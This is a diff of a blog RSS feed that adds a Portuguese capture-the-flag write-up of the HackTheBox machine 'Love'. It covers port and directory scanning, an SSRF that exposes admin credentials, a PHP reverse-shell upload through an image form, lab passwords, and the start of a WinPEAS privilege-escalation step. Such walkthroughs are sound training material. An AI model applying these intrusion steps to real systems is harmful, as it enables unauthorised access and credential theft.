@@ -5,8 +5,369 @@
         <description>Recent content in Posts on Haderach</description>
         <generator>Hugo -- gohugo.io</generator>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Fri, 20 Aug 2021 20:32:28 -0300</lastBuildDate>
+        <lastBuildDate>Sat, 21 Aug 2021 13:39:28 -0300</lastBuildDate>
         <atom:link href="https://brunomcuesta.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HackTheBox - Love</title>
+            <link>https://brunomcuesta.github.io/posts/2021/08/hackthebox-love/</link>
+            <pubDate>Sat, 21 Aug 2021 13:39:28 -0300</pubDate>
+            
+            <guid>https://brunomcuesta.github.io/posts/2021/08/hackthebox-love/</guid>
+            <description>Neste &amp;lsquo;writeup&amp;rsquo; veremos a resolução da máquina &amp;lsquo;Love&amp;rsquo; do HackTheBox.
+Informações da Máquina IP: 10.10.10.239
+Sistema Operacional: Windows
+Nível de dificuldade: Easy
+Varredura e Enumeração Port Scan # Nmap 7.91 scan initiated Thu Jun 24 17:39:25 2021 as: nmap -v -sC -sV -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -Pn -oN details.txt 10.10.10.239 Nmap scan report for 10.10.10.239 Host is up (0.48s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.</description>
+            <content type="html"><![CDATA[
+    <img src="https://i.imgur.com/npEuHZw.jpg"  alt="Love Cover"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Love&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>.</p>
+<h2 id="informações-da-máquina">Informações da Máquina</h2>
+<p>IP: 10.10.10.239</p>
+<p>Sistema Operacional: Windows</p>
+<p>Nível de dificuldade: Easy</p>
+<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
+<h3 id="port-scan">Port Scan</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Thu Jun 24 17:39:25 2021 as: nmap -v -sC -sV -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -Pn -oN details.txt 10.10.10.239</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.239
+Host is up <span style="color:#f92672">(</span>0.48s latency<span style="color:#f92672">)</span>.
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Apache httpd 2.4.46 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: examples
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Voting System using PHP
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.46 <span style="color:#f92672">(</span>OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
+|_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>staging.love.htb/organizationName<span style="color:#f92672">=</span>ValentineCorp/stateOrProvinceName<span style="color:#f92672">=</span>m/countryName<span style="color:#f92672">=</span>in
+| Issuer: commonName<span style="color:#f92672">=</span>staging.love.htb/organizationName<span style="color:#f92672">=</span>ValentineCorp/stateOrProvinceName<span style="color:#f92672">=</span>m/countryName<span style="color:#f92672">=</span>in
+| Public Key type: rsa
+| Public Key bits: <span style="color:#ae81ff">2048</span>
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-01-18T14:00:16
+| Not valid after:  2022-01-18T14:00:16
+| MD5:   bff0 1add <span style="color:#ae81ff">5048</span> afc8 b3cf <span style="color:#ae81ff">7140</span> 6e68 5ff6
+|_SHA-1: 83ed 29c4 70f6 <span style="color:#ae81ff">4036</span> a6f4 2d4d 4cf6 18a2 e9e4 96c2
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+445/tcp   open  microsoft-ds Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+3306/tcp  open  mysql?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|_    Host <span style="color:#e6db74">&#39;10.10.16.52&#39;</span> is not allowed to connect to this MariaDB server
+5000/tcp  open  http         Apache httpd 2.4.46 <span style="color:#f92672">(</span>OpenSSL/1.1.1j PHP/7.3.27<span style="color:#f92672">)</span>
+|_http-server-header: Apache/2.4.46 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+5040/tcp  open  unknown
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+|_http-title: Not Found
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>LOVE
+| Subject Alternative Name: DNS:LOVE, DNS:Love
+| Issuer: commonName<span style="color:#f92672">=</span>LOVE
+| Public Key type: rsa
+| Public Key bits: <span style="color:#ae81ff">4096</span>
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-04-11T14:39:19
+| Not valid after:  2024-04-10T14:39:19
+| MD5:   d35a 2ba6 8ef4 <span style="color:#ae81ff">7568</span> f99d d6f4 aaa2 03b5
+|_SHA-1: 84ef d922 a70a 6d9d 82b8 5bb3 d04f 066b 12f8 6e73
+|_ssl-date: 2021-06-24T21:16:39+00:00; +33m52s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+7680/tcp  open  pando-pub?
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V<span style="color:#f92672">=</span>7.91%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>6/24%Time<span style="color:#f92672">=</span>60D4ED8E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>HT
+SF:TPOptions,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x
+</span><span style="color:#e6db74">SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPR
+SF:equest,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20a
+</span><span style="color:#e6db74">SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RPCCheck
+SF:,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed
+</span><span style="color:#e6db74">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSVersionBind
+SF:ReqTCP,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20a
+</span><span style="color:#e6db74">SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSStatu
+SF:sRequestTCP,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not
+</span><span style="color:#e6db74">SF:\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Hel
+SF:p,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowe
+</span><span style="color:#e6db74">SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq
+SF:,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed
+</span><span style="color:#e6db74">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServer
+SF:Cookie,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20a
+</span><span style="color:#e6db74">SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSessi
+SF:onReq,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20al
+</span><span style="color:#e6db74">SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,
+SF:4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\
+</span><span style="color:#e6db74">SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SMBProgNeg,4A,<span style="color:#e6db74">&#34;
+</span><span style="color:#e6db74">SF:F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\x20t
+</span><span style="color:#e6db74">SF:o\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,4A,<span style="color:#e6db74">&#34;F\0\0
+</span><span style="color:#e6db74">SF:\x01\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\x20to\x20
+</span><span style="color:#e6db74">SF:connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPBindReq,4A,<span style="color:#e6db74">&#34;F\0\0\x0
+</span><span style="color:#e6db74">SF:1\xffj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\x20to\x20con
+</span><span style="color:#e6db74">SF:nect\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptions,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xf
+</span><span style="color:#e6db74">SF:fj\x04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\x20to\x20connect
+</span><span style="color:#e6db74">SF:\x20to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LANDesk-RC,4A,<span style="color:#e6db74">&#34;F\0\0\x01\xffj\x
+</span><span style="color:#e6db74">SF:04Host\x20&#39;10\.10\.16\.52&#39;\x20is\x20not\x20allowed\x20to\x20connect\x20
+</span><span style="color:#e6db74">SF:to\x20this\x20MariaDB\x20server&#34;</span><span style="color:#f92672">)</span>;
+Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h18m52s, deviation: 3h30m02s, median: 33m51s
+| smb-os-discovery: 
+|   OS: Windows <span style="color:#ae81ff">10</span> Pro <span style="color:#ae81ff">19042</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">10</span> Pro 6.3<span style="color:#f92672">)</span>
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: Love
+|   NetBIOS computer name: LOVE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|_  System time: 2021-06-24T14:16:15-07:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-24T21:16:22
+|_  start_date: N/A
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Thu Jun 24 17:42:50 2021 -- 1 IP address (1 host up) scanned in 204.45 seconds</span>
+</code></pre></div><h3 id="enumeração-de-diretórios">Enumeração de diretórios</h3>
+<p>Enumerando os diretórios com o gobuster foi possível encontrar uma página de login &lsquo;admin&rsquo; e serviços como &lsquo;tcpdf&rsquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u http://10.10.10.239 -w /home/bruno/github/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
+
+/includes             <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 340<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/includes/<span style="color:#f92672">]</span>
+/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 338<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/images/<span style="color:#f92672">]</span>  
+/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 337<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/admin/<span style="color:#f92672">]</span>   
+/plugins              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 339<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/plugins/<span style="color:#f92672">]</span> 
+/.htm                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/webalizer            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4388<span style="color:#f92672">]</span>                                   
+/phpmyadmin           <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/examples             <span style="color:#f92672">(</span>Status: 503<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 402<span style="color:#f92672">]</span>
+/.htc                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/dist                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 336<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/dist/<span style="color:#f92672">]</span>    
+/.html_var_de         <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/licenses             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 421<span style="color:#f92672">]</span>                                    
+/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 421<span style="color:#f92672">]</span> 
+/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/con                  <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/tcpdf                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 337<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.239/tcpdf/<span style="color:#f92672">]</span>   
+/.html.               <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.html.html           <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.htpasswds           <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span> 
+/.htm.                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.htmll               <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.html.old            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>
+/.html.bak            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.ht                  <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.htm.htm             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/aux                  <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.html1               <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.htgroup             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.html.lck            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.html.printable      <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>
+/prn                  <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                        
+/.htm.lck             <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.htaccess.bak        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.html.php            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.htmls               <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/.htx                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>                                    
+/server-info          <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 421<span style="color:#f92672">]</span>                                    
+/.htlm                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 302<span style="color:#f92672">]</span>
+</code></pre></div><h3 id="webserver">Webserver</h3>
+<p>Acessando a porta 80 encontramos uma página de login, solicitando a ID de votação e senha.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://10.10.10.239/
+</code></pre></div>
+    <img src="https://i.imgur.com/OPdc6yW.png"  alt="Love - Página Inicial"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Acessando a URL do tcpdf surge uma mensagem de erro.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://10.10.10.239/tcpdf/tcpdf.php
+</code></pre></div>
+    <img src="https://i.imgur.com/zKGQ75f.png"  alt="Tcpdf error"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Acessando a porta 5000 é informado que não temos permissão para visualizar seu conteúdo.</p>
+
+    <img src="https://i.imgur.com/9X5jnBJ.png"  alt="Forbidden porta 5000"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Para acessar a aplicação via domínio, que é mostrado pelo nmap, adicionamos o IP da máquina ao /etc/hosts.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.10.139 love.htb staging.love.htb
+</code></pre></div><p>Acessando a página via https.</p>
+
+    <img src="https://i.imgur.com/Cj5cRMT.png"  alt="Alerta certificado https"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Visualizando o certificado aparece um potencial nome de usuário do sistema, o &lsquo;<a href="mailto:roy@love.htb">roy@love.htb</a>&rsquo;</p>
+
+    <img src="https://i.imgur.com/oOOBsH7.png"  alt="Visualizando o certificado https"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Acessando a página via domínio aparece um menú com uma opção &ldquo;Demo&rdquo;.</p>
+
+    <img src="https://i.imgur.com/ZwwgbvS.png"  alt="Página Inicial - Free File Scanner"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>A página &ldquo;demo&rdquo; mostra um campo para submeter uma URL e informar o conteúdo da página solicitada.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://staging.love.htb/beta.php
+</code></pre></div>
+    <img src="https://i.imgur.com/PKSHEOP.png"  alt="Demo - Free File Scanner"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="vulnerabilidade">Vulnerabilidade</h2>
+<p>Nesta página &lsquo;Demo&rsquo; foram feitos diversos testes usando as URLS e portas mostradas na saída do Nmap:</p>
+<ul>
+<li>Ao informar 127.0.0.1 mostra a página de login.</li>
+<li>Ao informar 127.0.0.1/admin/ mostra a página de login do admin.</li>
+<li>Ao informar o 127.0.0.1/server-status mostra o status do servidor.</li>
+<li>Ao informar love.htb:47001 é mostrado o erro &ldquo;404 not found&rdquo;.</li>
+<li>Ao informar o path C:\xampp\htdocs\omrs\tcpdf\tcpdf.php mostra a mensagem &ldquo;Forbidden You don&rsquo;t have permission to access this resource&rdquo;.</li>
+</ul>
+<p>Após várias tentativas com portas e URLs a aplicação revela na porta 5000 a credencial do usuário admin.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">127.0.0.1:5000
+</code></pre></div>
+    <img src="https://i.imgur.com/CVGLwit.png"  alt="Credenciais Admin"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">admin: @LoveIsInTheAir!!!!
+</code></pre></div><p>Com as credenciais deste usuário podemos efetuar o login na área do admin.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://10.10.10.239/admin/index.php
+</code></pre></div>
+    <img src="https://i.imgur.com/CvkfAj9.png"  alt="Login Admin"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Visualizando o &lsquo;dashboard&rsquo; do admin após efetuar o login.</p>
+
+    <img src="https://i.imgur.com/lguY9Hi.png"  alt="Dashboard Admin"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="exploração">Exploração</h2>
+<p>Explorando o dashboard encontramos uma listagem de votantes.</p>
+
+    <img src="https://i.imgur.com/XRQZbJq.png"  alt="Dashboard - Lista de votantes"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Nesta página é possível cadastrar um novo votante com a possibilidade de fazer o upload de uma imagem. No campo de imagem deste form foi possível submeter um &lsquo;reverse shell&rsquo; em PHP.</p>
+
+    <img src="https://i.imgur.com/hQ3S4Sv.png"  alt="Dashboard - Cadastro de votante"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>O arquivo PHP será salvo na pasta images.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://10.10.10.239/images/myshell.php
+</code></pre></div><p>Após submeter o cadastro de votante e chamar o arquivo PHP enviado, recebemos a conexão do host com o usuário &lsquo;phoebe&rsquo;.</p>
+
+    <img src="https://i.imgur.com/H5aB8r3.png"  alt="Reverse Shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Visualizando o conteúdo do diretório &lsquo;images&rsquo; com o &lsquo;reverse shell&rsquo; em PHP.</p>
+
+    <img src="https://i.imgur.com/SARgzVI.png"  alt="Pasta Images"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Conteúdo do diretório &lsquo;omrs&rsquo; com os arquivos da aplicação Web.</p>
+
+    <img src="https://i.imgur.com/TZdEJWT.png"  alt="Pasta omrs"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Em busca de credenciais encontramos o diretório &lsquo;includes&rsquo; com o arquivo conn.php, responsável pela conexão com o banco de dados Mysql.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">C:\xampp\htdocs\omrs\includes\conn.php
+</code></pre></div>
+    <img src="https://i.imgur.com/7rKOpKa.png"  alt="Credenciais Mysql"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Credenciais do usuário &lsquo;phoebe&rsquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">phoebe:HTB#9826^(_
+</code></pre></div><p>Obtendo a flag do usuário &lsquo;phoebe&rsquo;.</p>
+
+    <img src="https://i.imgur.com/HfgQBH9.png"  alt="User Flag"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
+<p>Executando o <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPEAS</a> temos como resultado uma opção para escalar privilégios no host através do privilégio &ldquo;Always Install Elevated&rdquo;.</p>
+
+    <img src="https://i.imgur.com/3G2iV6d.png"  alt="WinPEAS"  class="center"  style="border-radius: 8px;"  />
+
+
